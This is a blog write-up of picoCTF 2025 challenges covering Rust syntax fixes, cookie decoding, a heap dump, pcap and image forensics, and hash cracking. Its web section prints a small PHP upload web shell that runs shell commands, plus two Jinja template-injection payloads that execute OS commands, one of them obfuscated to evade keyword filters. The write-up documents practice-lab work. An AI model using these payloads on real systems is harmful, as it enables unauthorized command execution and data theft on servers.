# Pico CTF 2025

Over the week Mar 7, 2025 – Mar 17, 2025, [pico CTF](https://picoctf.org/) was held and I fully participated to my extent. During this time, I only solved a range of challenges.

I've grouped them according to challenge type, Let's dive in:

## General skills

### Fantasy CTF

![Screenshot at 2025-03-08 22-39-17](/pico2025/Screenshot%20at%202025-03-08%2022-39-17.png)

Honestly, all I had to do for this challenge was connect to it through netcat, and navigate through it (using common sense and selecting the most obvious or expected choices), which led me to the flag

![Screenshot at 2025-03-08 22-39-33](/pico2025/Screenshot%20at%202025-03-08%2022-39-33.png)

![Screenshot at 2025-03-08 22-39-49](/pico2025/Screenshot%20at%202025-03-08%2022-39-49.png)

### Rust fix me

The below series of 3 challenges makes on fix the syntax errors in the below rust code to get the flag.

I honestly don't know how to write rust, therefore chatgpt did the work for me

#### 1:

Bad code:

![Screenshot at 2025-03-26 10-52-24](/pico2025/Screenshot%20at%202025-03-26%2010-52-24.png)

Fixed code:

![Screenshot at 2025-03-08 23-02-32](/pico2025/Screenshot%20at%202025-03-08%2023-02-32.png)

Flag:

![Screenshot at 2025-03-08 23-02-10](/pico2025/Screenshot%20at%202025-03-08%2023-02-10.png)



#### 2:

Bad code:

![Screenshot at 2025-03-26 10-53-48](/pico2025/Screenshot%20at%202025-03-26%2010-53-48.png)

Fixed code:

![Screenshot at 2025-03-26 10-38-47](/pico2025/Screenshot%20at%202025-03-26%2010-38-47.png)

Flag

![Screenshot at 2025-03-08 23-05-24](/pico2025/Screenshot%20at%202025-03-08%2023-05-24.png)

#### 3: 

Bad code:

![Screenshot at 2025-03-26 10-54-19](/pico2025/Screenshot%20at%202025-03-26%2010-54-19.png)

Fixed code:

![Screenshot at 2025-03-26 10-41-22](/pico2025/Screenshot%20at%202025-03-26%2010-41-22.png)



Flag:

![Screenshot at 2025-03-08 23-07-18](/pico2025/Screenshot%20at%202025-03-08%2023-07-18.png)

## Web

### Cookie Monster recipe

It's just a simple webpage with username and password login.

![Screenshot at 2025-03-08 22-45-26](/pico2025/Screenshot%20at%202025-03-08%2022-45-26.png)

First check, the sourcecode and inputting default credentials such as 'admin:admin' and i got this as the response

![Screenshot at 2025-03-08 22-44-10](/pico2025/Screenshot%20at%202025-03-08%2022-44-10.png)

On checking the cookies, I realized that it was base64 encoded (trailing equals sign '=='), proceeded to decode it and got the flag.

![Screenshot at 2025-03-08 22-45-06](/pico2025/Screenshot%20at%202025-03-08%2022-45-06.png)

### Head dump

All I had to do was navigate to a path which contains the head dump info.



![Screenshot at 2025-03-08 22-45-55](/pico2025/Screenshot%20at%202025-03-08%2022-45-55.png)

Luckily the page had an `api-docs` endpoint, whose last endpoint revealed it all. On accessing the endpoint, it downloaded a heapsnapshot file.

![Screenshot at 2025-03-08 22-54-05](/pico2025/Screenshot%20at%202025-03-08%2022-54-05.png)

The heapsnapshot file was full of ASCII text, which I grepped through (The flag format for the CTF was picoCTF{flag}), therefore:



![Screenshot at 2025-03-08 22-53-55](/pico2025/Screenshot%20at%202025-03-08%2022-53-55.png)

### No Sanity 1

Based on the description provided, this seems like a Insecure File Upload vulnerability. 

Since the website uses php and the flag is probably `flag.txt` or just `flag` I created the below script

```
<?php
$output = shell_exec('sudo cat /root/flag');
$other_output = shell_exec('sudo cat /root/flag');
echo "<pre>$output</pre>";
echo "<pre>$other_output</pre>";
>
```

The result:

![Screenshot at 2025-03-10 11-48-13](/pico2025/Screenshot%20at%202025-03-10%2011-48-13.png)



### SSTI 1

To test for server side template injection, I normally do the jinja `{{7*7}}` or the ruby `<%= 7*7 %>` which will output `49` which proves the server executes its input.\

![Screenshot at 2025-03-10 11-48-48](/pico2025/Screenshot%20at%202025-03-10%2011-48-48.png)

![Screenshot at 2025-03-10 11-48-54](/pico2025/Screenshot%20at%202025-03-10%2011-48-54.png)

However in this challenge, some keywords are actively blocked but I found the below payload which works:

```
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag')['read']()}}
```

This is an app running jinja version 2.0, which is why the payload is in python

![Screenshot at 2025-03-10 12-21-16](/pico2025/Screenshot%20at%202025-03-10%2012-21-16.png)

### SSTI 2

This is just SSTI 1 but with more keywords blocked, therefore I had to obfuscate the payload even more:

``` 
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls; cat flag')|attr('read')()}}
```

![Screenshot at 2025-03-10 13-46-27](/pico2025/Screenshot%20at%202025-03-10%2013-46-27.png)



## Forensics

### Phantom Intruder

Inspect a `.pcap` file using Wireshark and get the hidden flag. The hint was `time is of the essence`

![Screenshot at 2025-03-10 10-42-02](/pico2025/Screenshot%20at%202025-03-10%2010-42-02.png)

![Screenshot at 2025-03-10 10-42-21](/pico2025/Screenshot%20at%202025-03-10%2010-42-21.png)

I sorted the logs according to time, got the each packet info from the series, and decoded it on cyberchef ; it was base64 encoded and got the flag.

![Screenshot at 2025-03-10 10-42-08](/pico2025/Screenshot%20at%202025-03-10%2010-42-08.png)



### RED

You have to download the image which is just the color red. There is nothing special on this.

![Screenshot at 2025-03-10 16-58-11](/pico2025/Screenshot%20at%202025-03-10%2016-58-11.png)

I ran multiple forensics programs on it, binwalk,file, hexdumps

I also ran strings on it to examine some of its metadata but only got a poem (big dead end)

I almost gave up but uploaded the image to an online image forensics tool, [aperisolve](https://aperisolve.com), which showed me some base64 encoded writing.

![Screenshot at 2025-03-10 16-57-43](/pico2025/Screenshot%20at%202025-03-10%2016-57-43.png)



I proceeded onto cyberchef where I got the flag!!

![Screenshot at 2025-03-10 16-57-35](/pico2025/Screenshot%20at%202025-03-10%2016-57-35.png)

### Hashcrack

All I ad to do here, according to the challenge description, is just crack weakly hashed passwords. Since they are weak hashes, they are obviously in a common database such as [Crackstation](https://crackstation.net)



![Screenshot at 2025-03-08 23-09-51](/pico2025/Screenshot%20at%202025-03-08%2023-09-51.png)

Once connected to the server using netcat, I just copied each hash to crackstation, waited for the password and continued to the flag:



![Screenshot at 2025-03-08 23-08-45](/pico2025/Screenshot%20at%202025-03-08%2023-08-45.png)







![Screenshot at 2025-03-08 23-08-55](/pico2025/Screenshot%20at%202025-03-08%2023-08-55.png)



![Screenshot at 2025-03-08 23-09-19](/pico2025/Screenshot%20at%202025-03-08%2023-09-19.png)



![Screenshot at 2025-03-08 23-09-29](/pico2025/Screenshot%20at%202025-03-08%2023-09-29.png)

![Screenshot at 2025-03-08 23-09-43](/pico2025/Screenshot%20at%202025-03-08%2023-09-43.png)

![Screenshot at 2025-03-08 23-09-51](/pico2025/Screenshot%20at%202025-03-08%2023-09-51.png)

Got the flag!!!

All these challenges still exist and are available on the pico website. Please go enjoy, THANK YOU!!!
